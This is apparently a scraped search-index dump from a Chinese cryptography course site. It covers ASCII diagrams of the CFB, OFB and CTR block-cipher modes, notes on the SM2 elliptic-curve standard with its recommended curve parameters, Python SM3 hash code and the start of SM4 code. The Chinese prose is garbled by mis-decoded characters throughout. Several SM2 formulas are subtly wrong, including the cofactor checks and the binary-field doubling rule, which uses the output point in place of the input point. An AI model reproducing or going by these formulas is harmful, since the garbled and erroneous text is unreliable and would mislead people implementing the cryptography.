+--------------------\u0026gt;xor | | | v | v +-------------------------+ | +-------------------------+\rkey----\u0026gt;| block cipher encryption | | key----\u0026gt;| block cipher encryption |\r+------------|------------+ | +------------|------------+\r| | | v | v +-----------------+ | +------------------+ | ciphertext[0:n] -----+ | ciphertext[n:2n] | +-----------------+ +------------------+ å¯†ç åé¦ˆ CFB #   iv | --------------------------+ v | v +-------------------------+ | +-------------------------+\rkey----\u0026gt;| block cipher encryption | | key----\u0026gt;| block cipher encryption |\r+------------+------------+ | +------------+------------+\r| | | +----------------+ v | +-----------------+ v | plaintext[0:n] +--\u0026gt;xor | | plaintext[n:2n] +--\u0026gt;xor\r+----------------+ | | +-----------------+ | v | v +-----------------+ | +------------------+ | ciphertext[0:n] +----+ | ciphertext[n:2n] | +-----------------+ +------------------+ è¾“å‡ºåé¦ˆ OFB #   iv | --------------------------+ v | v +-------------------------+ | +-------------------------+\rkey----\u0026gt;| block cipher encryption | | key----\u0026gt;| block cipher encryption |\r+------------+------------+ | +------------+------------+\r| | |\r+--------------+ | +----------------+ v +-----------------+ v | plaintext[0:n] +--\u0026gt;xor | plaintext[n:2n] +--\u0026gt;xor +----------------+ | +-----------------+ | v v +-----------------+ +------------------+ | ciphertext[0:n] | | ciphertext[n:2n] | +-----------------+ +------------------+ è®¡æ•°å™¨ CTR #   +----------+----------+ +----------+----------+ | nonce |counter=0 | | nonce |counter=1 | +----------+----------+ +----------+----------+ | | v v +-------------------------+ +-------------------------+\rkey----\u0026gt;| block cipher encryption | key----\u0026gt;| block cipher encryption |\r+------------+------------+ +------------+------------+\r| | +----------------+ v +-----------------+ v | plaintext[0:n] ---\u0026gt;xor | plaintext[n:2n] ---\u0026gt;xor +----------------+ | +-----------------+ | v v +-----------------+ +------------------+ | ciphertext[0:n] | | ciphertext[n:2n] | +-----------------+ +------------------+ "},{"id":261,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm2/","title":"Sm2","section":"å›½å¯†ç®—æ³•","content":"SM 2 #  æœ‰é™åŸŸ #  æœ¬æ¡ç»™å‡ºæœ‰é™åŸŸ $$F_q$$ çš„æè¿°åŠå…¶å…ƒç´ çš„è¡¨ç¤ºï¼Œq æ˜¯ä¸€ä¸ªå¥‡ç´ æ•°æˆ–è€…æ˜¯ 2 çš„æ–¹å¹‚ã€‚\n å½“ q æ˜¯å¥‡ç´ æ•° p æ—¶ï¼Œè¦æ±‚ p \u0026gt; $$2^{191}$$ï¼› å½“ q æ˜¯ 2 çš„æ–¹å¹‚ $$2^m$$ æ—¶ï¼Œè¦æ±‚ m \u0026gt; 192 ä¸”ä¸ºç´ æ•°ã€‚  ç´ åŸŸ #  å¦‚æœæ˜¯ç¬¬ä¸€ç§æƒ…å†µï¼Œq æ˜¯å¥‡ç´ æ•° p æ—¶ï¼Œç´ åŸŸ $$F_p$$ ä¸­çš„å…ƒç´ ç”¨ $${0, 1, \\cdots, p-1}$$ è¡¨ç¤ºã€‚\nè¿™ä¸ªåŸŸæœ‰ä»¥ä¸‹çš„ç‰¹ç‚¹ï¼š\n  åŠ æ³•å•ä½å…ƒæ˜¯æ•´æ•° 0ï¼›\n  ä¹˜æ³•å•ä½å…ƒæ˜¯æ•´æ•° 1ï¼›\n  åŸŸå…ƒç´ åŠ æ³•æ˜¯æ•´æ•°æ¨¡ p åŠ æ³•ï¼š$$a, b \\in F_p$$ï¼Œåˆ™ $$a + b \\rightarrow (a+b) \\pmod{p}$$\n  åŸŸå…ƒç´ ä¹˜æ³•æ˜¯æ•´æ•°æ¨¡ p ä¹˜æ³•ï¼š$$a, b \\in F_p$$ï¼Œåˆ™ $$ab \\rightarrow ab \\pmod{p}$$\n  äºŒå…ƒæ‰©åŸŸ #  å½“ q æ˜¯ 2 çš„æ–¹å¹‚ $$2^m$$ æ—¶ï¼ŒäºŒå…ƒæ‰©åŸŸ $$F_{2^m}$$ å¯ä»¥çœ‹æˆ $$F_2$$ ä¸Šçš„ m ç»´å‘é‡ç©ºé—´ï¼Œå…¶å…ƒç´ å¯ç”¨é•¿åº¦ä¸º m çš„æ¯”ç‰¹ä¸²è¡¨ç¤ºã€‚m ä¸Šçš„å…ƒç´ ä¸»è¦æœ‰å¤šé¡¹å¼åŸºï¼ˆPBï¼‰ä¸æ­£è§„åŸºï¼ˆNBï¼‰ä¸¤ç§è¡¨ç¤ºæ–¹æ³•ã€‚ä¸‹é¢ä»¥å‰è€…ä¸ºä¾‹ï¼š\nå¤šé¡¹å¼åŸºï¼š\n è®¾ $$F_2$$ ä¸Šçš„ m æ¬¡ä¸å¯çº¦å¤šé¡¹å¼ $$f(x) = x^m + f_{m-1} x^{m-1} + \\cdots + f_1 x + f_0, \\text{where }f_i \\in F_2$$ï¼Œåˆ™ $$F_{2^m}$$ ç”± $$F_2$$ ä¸Šæ‰€æœ‰æ¬¡æ•°ä½äº m çš„å¤šé¡¹å¼æ„æˆã€‚ å¤šé¡¹å¼é›†åˆ $${x_{mâˆ’1};x_{mâˆ’2}; \\cdots ;x;1}$$æ˜¯ $$F_{2^m}$$ åœ¨ $$F_2$$ä¸Šçš„ä¸€ç»„åŸºï¼Œç§°ä¸ºå¤šé¡¹å¼åŸºã€‚ $$F_{2^m}$$ ä¸­çš„ä»»æ„ä¸€ä¸ªå…ƒç´  $$a(x) = a_{mâˆ’1}x_{mâˆ’1} +a_{mâˆ’2}x_{mâˆ’2} + \\cdots +a_1x+a_0$$ åœ¨ $$F_2$$ ä¸Šçš„ç³»æ•°æ°å¥½æ„æˆäº†é•¿åº¦ä¸º m çš„æ¯”ç‰¹ä¸²ï¼Œç”¨ $$a = (a_{mâˆ’1};a_{mâˆ’2}; \\cdots ;a_1;a_0)$$ è¡¨ç¤ºã€‚  è¿™ä¸ªåŸŸæœ‰ä»¥ä¸‹çš„ç‰¹ç‚¹ï¼š\n  åŠ æ³•å•ä½å…ƒæ˜¯ $$(\\underbrace{0, \\cdots, 0, 0}_{m})$$ï¼›\n  ä¹˜æ³•å•ä½å…ƒæ˜¯ $$\\displaystyle (\\underbrace{0, \\cdots, 0}_{m-1}, 1)$$ï¼›\n  åŸŸå…ƒç´ çš„åŠ æ³•è¿ç®—ï¼š$$(a_{mâˆ’1};\\cdots ; a_0) + (b_{mâˆ’1}; \\cdots ;b_0) = (a_{mâˆ’1} \\oplus b_{m-1}; \\cdots ;a_0 \\oplus b_0)$$\n  åŸŸå…ƒç´ çš„ä¹˜æ³•è¿ç®—ï¼š$$a(x) \\cdot b(x) \\rightarrow a(x) \\cdot b(x) \\pmod{f(x)}$$\n  æ¤­åœ†æ›²çº¿ #  æœ‰é™åŸŸ $$F_q$$ ä¸Šçš„æ¤­åœ†æ›²çº¿æ˜¯ç”±ç‚¹ç»„æˆçš„é›†åˆã€‚\nåœ¨ä»¿å°„åæ ‡ç³»ä¸‹ï¼Œæ¤­åœ†æ›²çº¿ä¸Šç‚¹ Pï¼ˆéæ— ç©·è¿œç‚¹ï¼‰çš„åæ ‡è¡¨ç¤ºä¸º $$P = (x_P;y_P)$$ï¼Œå…¶ä¸­ $$x_P, y_P$$ ä¸ºæ»¡è¶³ä¸€å®šæ–¹ç¨‹çš„åŸŸå…ƒç´ ï¼Œåˆ†åˆ«ç§°ä¸ºç‚¹ P çš„ x åæ ‡å’Œ y åæ ‡ã€‚åœ¨æœ¬æ–‡æœ¬ä¸­ï¼Œç§° $$F_q$$ä¸ºåŸºåŸŸã€‚\nç´ åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿ #  å®šä¹‰åœ¨ $$F_p$$ ä¸Šçš„æ¤­åœ†æ–¹ç¨‹ä¸ºï¼š\n $$E: y^2 = x^3 + ax + b \\text{ where } a,b \\in F_p, 4a^3 +27b^2 \\not\\equiv 0 \\pmod{p}$$  æ¤­åœ†æ›²çº¿ $$E(F_p)$$ å®šä¹‰ä¸ºï¼š\n $$E(F_p) = {(x, y) | x,y \\in F_p, (x,y) \\in E} \\cup{O}$$ï¼Œå…¶ä¸­ O æ˜¯æ— ç©·è¿œç‚¹ã€‚  æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹çš„æ•°ç›®è®°ä½œæ¤­åœ†æ›²çº¿çš„é˜¶ã€‚\nç´ åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿ç¾¤ #  æ¤­åœ†æ›²çº¿ $$E(F_p)$$ ä¸Šçš„ç‚¹ï¼ŒæŒ‰ç…§ä¸‹é¢çš„è¿ç®—è§„åˆ™ï¼Œæ„æˆä¸€ä¸ªäº¤æ¢ç¾¤ï¼š\n  $$\\forall P = (x,y) \\in E(F_p)$$ï¼ŒP çš„é€†å…ƒ $$-P = (x, -y)$$ï¼Œ$$P + (-P) = O$$\n  ä¸¤ä¸ªéé€†ä¸ç›¸åŒç‚¹ç›¸åŠ çš„è§„åˆ™ï¼š\n  è®¾ $$P_1, P_2 = (x_1, y_1), (x_2, y_2) \\in E(F_p) \\backslash {O}, \\text{where } x_1 \\not= x_2$$\n  è®¾ $$P_3 = P_1 + P_2 = (x_3, y_3)$$ï¼Œåˆ™ï¼š$$\\displaystyle \\begin{cases}x_3 = \\lambda^2 - x_1 - x_2 \\ y_3 = \\lambda (x_1 - x_3) - y_1\\end{cases}$$ï¼Œå…¶ä¸­ $$\\displaystyle \\lambda = \\frac{y_2 - y_1}{x_2 - x_1}$$\n    å€åŠ è§„åˆ™ï¼š\n è®¾ $$P_0 = (x_0, y_0) \\in E(F_p) \\backslash {O}, \\text{where } y_0 \\not= 0$$ è®¾ $$P_1 = P_0 +P_0 = (x_1, y_1)$$ï¼Œåˆ™ï¼š$$\\displaystyle \\begin{cases}x_1 = \\lambda^2 - 2x_0 \\ y_1 = \\lambda(x_0 - x_1) - y_0\\end{cases}$$ï¼Œå…¶ä¸­ $$\\displaystyle \\lambda = \\frac{3 x_0^2 + a}{2y_0}$$    äºŒå…ƒæ‰©åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿ #  å®šä¹‰åœ¨ $$F_{2^m}$$ ä¸Šçš„æ¤­åœ†æ–¹ç¨‹ä¸ºï¼š\n $$E: y^2 + xy = x^3 + ax^2 + b \\text{ where } a,b \\in F_{2^m}, b \\not= 0$$  æ¤­åœ†æ›²çº¿ $$E(F_{2^m})$$ å®šä¹‰ä¸ºï¼š\n $$E(F_{2^m}) = {(x,y) | x,y \\in F_{2^m}, (x,y) \\in E} \\cup {O}$$ï¼Œå…¶ä¸­ O æ˜¯æ— ç©·è¿œç‚¹ã€‚  æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹çš„æ•°ç›®è®°ä½œæ¤­åœ†æ›²çº¿çš„é˜¶ã€‚\näºŒå…ƒæ‰©åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿ç¾¤ #  æ¤­åœ†æ›²çº¿ $$E(F_{2^m})$$ ä¸Šçš„ç‚¹ï¼ŒæŒ‰ç…§ä¸‹é¢çš„è¿ç®—è§„åˆ™ï¼Œæ„æˆä¸€ä¸ªäº¤æ¢ç¾¤ï¼š\n  $$\\forall P = (x,y) \\in E(F_p)$$ï¼ŒP çš„é€†å…ƒ $$-P = (x, x+y)$$ï¼Œ$$P + (-P) = O$$\n  ä¸¤ä¸ªéé€†ä¸ç›¸åŒç‚¹ç›¸åŠ çš„è§„åˆ™ï¼š\n è®¾ $$P_1, P_2 = (x_1, y_1), (x_2, y_2) \\in E(F_{2^m}) \\backslash {O}, \\text{where } x_1 \\not= x_2$$ è®¾ $$P_3 = P_1 + P_2 = (x_3, y_3)$$ï¼Œåˆ™ï¼š$$\\displaystyle \\begin{cases} x_3 = \\lambda^2 + \\lambda + x_1 + x_2 + a \\ y_3 = \\lambda (x_1 + x_3) + x_3 + y_1 \\end{cases}$$ï¼Œå…¶ä¸­ $$\\displaystyle \\lambda = \\frac{y_1 + y_2}{x_1 + x_2}$$    å€åŠ è§„åˆ™ï¼š\n è®¾ $$P_0 = (x_0, y_0) \\in E(F_{2^m}) \\backslash {O}, \\text{where } y_0 \\not= 0$$ è®¾ $$P_1 = P_0 +P_0 = (x_1, y_1)$$ï¼Œåˆ™ï¼š$$\\displaystyle \\begin{cases}x_1 = \\lambda^2 + \\lambda + a \\ y_1 = x_0^2 + (\\lambda + 1)x_0\\end{cases}$$ï¼Œå…¶ä¸­ï¼š$$\\displaystyle \\lambda = x_1 + \\frac{y_1}{x_1}$$    æ•°æ®ç±»å‹åŠè½¬æ¢ #  æ•°æ®ç±»å‹ #  ä¸‹é¢åˆ—ä¸¾ç®—æ³•ä¸­ä¼šç”¨åˆ°çš„æ‰€æœ‰æ•°æ®ç±»å‹ï¼š\n  æ¯”ç‰¹ä¸²ï¼šæœ‰åºçš„ 0 å’Œ 1 çš„åºåˆ—ã€‚\n  å­—èŠ‚ä¸²ï¼šæœ‰åºçš„å­—èŠ‚åºåˆ—ï¼Œå…¶ä¸­ 8 æ¯”ç‰¹ä¸º 1 ä¸ªå­—èŠ‚ã€‚\n  åŸŸå…ƒç´ ï¼šæœ‰é™åŸŸ $$F_q$$ ä¸­çš„å…ƒç´ ã€‚\n  æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ï¼šæ¤­åœ†æ›²çº¿çš„ç‚¹æœ‰å¾ˆå¤šè¡¨ç¤ºæ–¹å¼ï¼Œä½†æ˜¯æ‰€æœ‰çš„è¡¨ç¤ºæ–¹å¼éƒ½å¯ä»¥è¡¨ç¤ºä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š\n\u0026lt;PC\u0026gt; || \u0026lt;ç‚¹æ¨ªåæ ‡è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²\u0026gt; || \u0026lt;ç‚¹çš„çºµåæ ‡è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²\u0026gt; å…¶ä¸­ PC ç”¨äºè¡¨ç¤ºåŸŸå…ƒç´ è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²çš„æ–¹å¼ï¼š\n å¦‚æœæ˜¯ä½¿ç”¨å‹ç¼©å½¢å¼è¡¨ç¤ºï¼ŒPC = 02 æˆ– 03ï¼› å¦‚æœæ˜¯ä½¿ç”¨æœªå‹ç¼©å½¢å¼è¡¨ç¤ºï¼ŒPC = 04ï¼› å¦‚æœæ˜¯ä½¿ç”¨æ··åˆå½¢å¼è¡¨ç¤ºï¼ŒPC = 06 æˆ– 07ã€‚    å‚æ•°ä»¥åŠéªŒè¯ #  ç´ åŸŸç³»ç»Ÿå‚æ•° #  $$F_p$$ çš„ç³»ç»Ÿå‚æ•°ä¸»è¦æœ‰ä»¥ä¸‹çš„å‡ ä¸ªï¼š\n åŸŸçš„è§„æ¨¡ p æ˜¯ä¸€ä¸ªå¤§äº 3 çš„ç´ æ•°ï¼› ä¸€ä¸ªé•¿åº¦è‡³å°‘ä¸º 192 çš„æ¯”ç‰¹ä¸² SEEDï¼› $$F_p$$ ä¸­çš„ä¸¤ä¸ªå…ƒç´  a ä¸ bï¼Œå®ƒä»¬å®šä¹‰äº†æ¤­åœ†æ›²çº¿çš„æ–¹ç¨‹ï¼š$$y^2 = x^3 + ax + b$$ åŸºç‚¹ $$G = (x_G, y_G) \\in E(F_p) \\backslash {O}$$ï¼› åŸºç‚¹ G çš„é˜¶ nï¼Œn éœ€è¦æ»¡è¶³ $$n \u0026gt; 2^{191}, n \u0026gt; 4 p^{\\frac{1}{2}}$$ï¼› ä½™å› å­ $$\\displaystyle h = \\frac{#E(F_p)}{n}$$ï¼›  é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜åº”è¯¥è¿›è¡Œä»¥ä¸‹çš„å‡ æ­¥å¯¹ç³»ç»Ÿå‚æ•°è¿›è¡Œåˆç†æ€§éªŒè¯ï¼ˆæ­¤å¤„å·²ç»ç•¥å»åœ¨ç”Ÿæˆè¿‡ç¨‹ä¸­å·²ç»æŒ‡æ˜çš„æ¡ä»¶ï¼‰ï¼š\n éªŒè¯ $$4a^3 +27b^2 \\not= 0 \\pmod{p}$$ï¼› è®¡ç®— $$\\displaystyle h\u0026rsquo; = [\\frac{(p^2 + 1)^2}{n}]$$ï¼Œå¹¶éªŒè¯ $$h\u0026rsquo; = h$$ï¼› æŠ— MOV æ”»å‡»å’ŒæŠ—å¼‚å¸¸æ›²çº¿æ”»å‡»æˆç«‹ã€‚  äºŒå…ƒæ‰©åŸŸç³»ç»Ÿå‚æ•° #  $$F_{2^m}$$ ä¸Šçš„ç³»ç»Ÿå‚æ•°ä¸»è¦æœ‰ä»¥ä¸‹çš„å‡ ä¸ªï¼š\n åŸŸçš„è§„æ¨¡ $$2^m$$ï¼Œä»¥åŠæŒ‡å®šä¸€ä¸ªåŸŸä¸­å…ƒç´ çš„è¡¨ç¤ºæ–¹æ³•ï¼› ä¸€ä¸ªé•¿åº¦è‡³å°‘ä¸º 192 çš„æ¯”ç‰¹ä¸² SEEDï¼› $$F_{2^m}$$ ä¸­çš„ä¸¤ä¸ªå…ƒç´  a ä¸ bï¼Œå®ƒä»¬å®šä¹‰äº†æ¤­åœ†æ›²çº¿çš„æ–¹ç¨‹ï¼š$$y^2 + xy = x^3 + ax^2 + b$$ åŸºç‚¹ $$G = (x_G, y_G) \\in E(F_{2^m}) \\backslash {O}$$ï¼› åŸºç‚¹ G çš„é˜¶ nï¼Œn éœ€è¦æ»¡è¶³ $$n \u0026gt; 2^{191}, n \u0026gt; 2^{2 + \\frac{m}{2}}$$ï¼› ä½™å› å­ $$\\displaystyle h = \\frac{#E(F_p)}{n}$$ï¼›  é™¤æ­¤ä¹‹å¤–ï¼ŒåŒæ ·ä¹Ÿåº”è¯¥è¿›è¡Œä»¥ä¸‹çš„å‡ æ­¥å¯¹ç³»ç»Ÿå‚æ•°è¿›è¡Œåˆç†æ€§éªŒè¯ï¼š\n é€šè¿‡åŸŸä¸­å…ƒç´ è¡¨ç¤ºæ–¹å¼è¿›è¡ŒéªŒè¯ï¼š  è‹¥æ‰€ç”¨çš„æ˜¯ TPBï¼Œåˆ™éªŒè¯çº¦åŒ–å¤šé¡¹å¼æ˜¯ $$F_2$$ ä¸Šçš„ä¸å¯çº¦ä¸‰é¡¹å¼ï¼› è‹¥æ‰€ç”¨çš„æ˜¯ PPBï¼Œåˆ™éªŒè¯ä¸å­˜åœ¨ m æ¬¡ä¸å¯çº¦ä¸‰é¡¹å¼ï¼Œä¸”çº¦åŒ–å¤šé¡¹å¼æ˜¯ $$F_2$$ ä¸Šçš„ä¸å¯çº¦äº” é¡¹å¼ï¼› è‹¥æ‰€ç”¨çš„æ˜¯ GNBï¼Œåˆ™éªŒè¯mä¸èƒ½è¢«8æ•´é™¤ï¼›   éªŒè¯ $$b \\not= 0$$ï¼› è®¡ç®— $$\\displaystyle h\u0026rsquo; = [\\frac{(m^{\\frac{m}{2}} + 1)^2}{n}]$$ï¼Œå¹¶éªŒè¯ $$h\u0026rsquo; = h$$ï¼› æŠ— MOV æ”»å‡»æ¡ä»¶æˆç«‹ï¼›  å¯†é’¥å¯¹ #  å¯¹äºå·²ç»å¾—åˆ°çš„ä¸€ä¸ªæ¤­åœ†æ›²çº¿ $$E(F_q)$$ï¼Œç»è¿‡éœ€è¦è¿›è¡Œä»¥ä¸‹è®¡ç®—ï¼š\n äº§ç”Ÿéšæœºæ•´æ•° $$d \\in [1, n-2]$$ï¼› G ä¸ºåŸºç‚¹ï¼Œè®¡ç®— $$P = (x_P, y_P) = [d]G$$ï¼› å¾—åˆ°å¯†é’¥å¯¹æ˜¯ $$(d, P)$$ï¼Œå‰è€…æ˜¯ç§é’¥ï¼Œåè€…æ˜¯å…¬é’¥ã€‚  å¯¹äºç”Ÿæˆçš„å¯†é’¥å¯¹ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å…¬é’¥è¿›è¡ŒéªŒè¯ï¼š\n é¦–å…ˆéœ€è¦éªŒè¯ P ä¸ä¸ºæ— ç©·è¿œç‚¹ Oï¼› éªŒè¯ P æ˜¯å¦æ»¡è¶³æ¤­åœ†æ›²çº¿æ–¹ç¨‹ï¼ŒP åæ ‡æ˜¯å¦åœ¨ç´ åŸŸä¸Šï¼› éªŒè¯ $$[n]P = O$$ï¼›  æ¨èå‚æ•° #  æ¨èä½¿ç”¨ç´ æ•°åŸŸ256ä½æ¤­åœ†æ›²çº¿ã€‚æ¤­åœ†æ›²çº¿æ–¹ç¨‹ï¼š$$y^2 = x^3 + ax + b$$ã€‚\næ›²çº¿å‚æ•°ï¼š\np=FFFFFFFE FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF 00000000 FFFFFFFF FFFFFFFF\ra=FFFFFFFE FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF 00000000 FFFFFFFF FFFFFFFC\rb=28E9FA9E 9D9F5E34 4D5A9E4B CF6509A7 F39789F5 15AB8F92 DDBCBD41 4D940E93\rn=FFFFFFFE FFFFFFFF FFFFFFFF FFFFFFFF 7203DF6B 21C6052B 53BBF409 39D54123\rGx=32C4AE2C 1F198119 5F990446 6A39C994 8FE30BBF F2660BE1 715A4589 334C74C7\rGy=BC3736A2 F4F6779C 59BDCEE3 6B692153 D0A9877C C62A4740 02DF32E5 2139F0A0 "},{"id":262,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm3/","title":"Sm3","section":"å›½å¯†ç®—æ³•","content":"SM 3 #  ç›´æ¥ä¸Šä»£ç ï¼ˆgithubï¼‰ï¼š\nimport binascii from math import ceil from .func import rotl, bytes_to_list  IV = [  1937774191, 1226093241, 388252375, 3666478592,  2842636476, 372324522, 3817729613, 2969243214, ]  T_j = [  2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169,  2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169,  2043430169, 2043430169, 2043430169, 2043430169, 2055708042, 2055708042,  2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,  2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,  2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,  2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,  2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,  2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,  2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042,  2055708042, 2055708042, 2055708042, 2055708042 ]  def sm3_ff_j(x, y, z, j):  if 0 \u0026lt;= j and j \u0026lt; 16:  ret = x ^ y ^ z  elif 16 \u0026lt;= j and j \u0026lt; 64:  ret = (x \u0026amp; y) | (x \u0026amp; z) | (y \u0026amp; z)  return ret  def sm3_gg_j(x, y, z, j):  if 0 \u0026lt;= j and j \u0026lt; 16:  ret = x ^ y ^ z  elif 16 \u0026lt;= j and j \u0026lt; 64:  #ret = (X | Y) \u0026amp; ((2 ** 32 - 1 - X) | Z)  ret = (x \u0026amp; y) | ((~ x) \u0026amp; z)  return ret  def sm3_p_0(x):  return x ^ (rotl(x, 9 % 32)) ^ (rotl(x, 17 % 32))  def sm3_p_1(x):  return x ^ (rotl(x, 15 % 32)) ^ (rotl(x, 23 % 32))  def sm3_cf(v_i, b_i):  w = []  for i in range(16):  weight = 0x1000000  data = 0  for k in range(i*4,(i+1)*4):  data = data + b_i[k]*weight  weight = int(weight/0x100)  w.append(data)   for j in range(16, 68):  w.append(0)  w[j] = sm3_p_1(w[j-16] ^ w[j-9] ^ (rotl(w[j-3], 15 % 32))) ^ (rotl(w[j-13], 7 % 32)) ^ w[j-6]  str1 = \u0026#34;%08x\u0026#34; % w[j]  w_1 = []  for j in range(0, 64):  w_1.append(0)  w_1[j] = w[j] ^ w[j+4]  str1 = \u0026#34;%08x\u0026#34; % w_1[j]   a, b, c, d, e, f, g, h = v_i   for j in range(0, 64):  ss_1 = rotl(  ((rotl(a, 12 % 32)) +  e +  (rotl(T_j[j], j % 32))) \u0026amp; 0xffffffff, 7 % 32  )  ss_2 = ss_1 ^ (rotl(a, 12 % 32))  tt_1 = (sm3_ff_j(a, b, c, j) + d + ss_2 + w_1[j]) \u0026amp; 0xffffffff  tt_2 = (sm3_gg_j(e, f, g, j) + h + ss_1 + w[j]) \u0026amp; 0xffffffff  d = c  c = rotl(b, 9 % 32)  b = a  a = tt_1  h = g  g = rotl(f, 19 % 32)  f = e  e = sm3_p_0(tt_2)   a, b, c, d, e, f, g, h = map(  lambda x:x \u0026amp; 0xFFFFFFFF ,[a, b, c, d, e, f, g, h])   v_j = [a, b, c, d, e, f, g, h]  return [v_j[i] ^ v_i[i] for i in range(8)]  def sm3_hash(msg):  # print(msg)  len1 = len(msg)  reserve1 = len1 % 64  msg.append(0x80)  reserve1 = reserve1 + 1  # 56-64, add 64 byte  range_end = 56  if reserve1 \u0026gt; range_end:  range_end = range_end + 64   for i in range(reserve1, range_end):  msg.append(0x00)   bit_length = (len1) * 8  bit_length_str = [bit_length % 0x100]  for i in range(7):  bit_length = int(bit_length / 0x100)  bit_length_str.append(bit_length % 0x100)  for i in range(8):  msg.append(bit_length_str[7-i])   group_count = round(len(msg) / 64)   B = []  for i in range(0, group_count):  B.append(msg[i*64:(i+1)*64])   V = []  V.append(IV)  for i in range(0, group_count):  V.append(sm3_cf(V[i], B[i]))   y = V[i+1]  result = \u0026#34;\u0026#34;  for i in y:  result = \u0026#39;%s%08x\u0026#39; % (result, i)  return result  def sm3_kdf(z, klen): # zä¸º16è¿›åˆ¶è¡¨ç¤ºçš„æ¯”ç‰¹ä¸²ï¼ˆstrï¼‰ï¼Œklenä¸ºå¯†é’¥é•¿åº¦ï¼ˆå•ä½byteï¼‰  klen = int(klen)  ct = 0x00000001  rcnt = ceil(klen/32)  zin = [i for i in bytes.fromhex(z.decode(\u0026#39;utf8\u0026#39;))]  ha = \u0026#34;\u0026#34;  for i in range(rcnt):  msg = zin + [i for i in binascii.a2b_hex((\u0026#39;%08x\u0026#39; % ct).encode(\u0026#39;utf8\u0026#39;))]  ha = ha + sm3_hash(msg)  ct += 1  return ha[0: klen * 2] "},{"id":263,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm4/","title":"Sm4","section":"å›½å¯†ç®—æ³•","content":"SM 4 #  ç›´æ¥ä¸Šä»£ç ï¼ˆgithubï¼‰ï¼š\n#-*-coding:utf-8-*- import copy from .func import xor, rotl, get_uint32_be, put_uint32_be, \\  bytes_to_list, list_to_bytes, padding, unpadding  #Expanded SM4 box table SM4_BOXES_TABLE = [  0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,  0x05,0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,  0x06,0x99,0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,  0xcf,0xac,0x62,0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,  0x75,0x8f,0x3f,0xa6,0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,  0x19,0xe6,0x85,0x4f,0xa8,0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,  0x0f,0x4b,0x70,0x56,0x9d,0x35,0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,  0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,  0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,  0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,0xe0,0xae,0x5d,0xa4,0x9b,0x34,  0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,0x1d,0xf6,0xe2,0x2e,0x82,  0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,0xd5,0xdb,0x37,0x45,  0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,0x8d,0x1b,0xaf,  0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,0x0a,0xc1,  0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,0x89,  0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,  0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,  0x48, ]  # System parameter SM4_FK = [0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc]  # fixed parameter SM4_CK = [  0x00070e15,0x1c232a31,0x383f464d,0x545b6269,  0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,  0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,  0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,  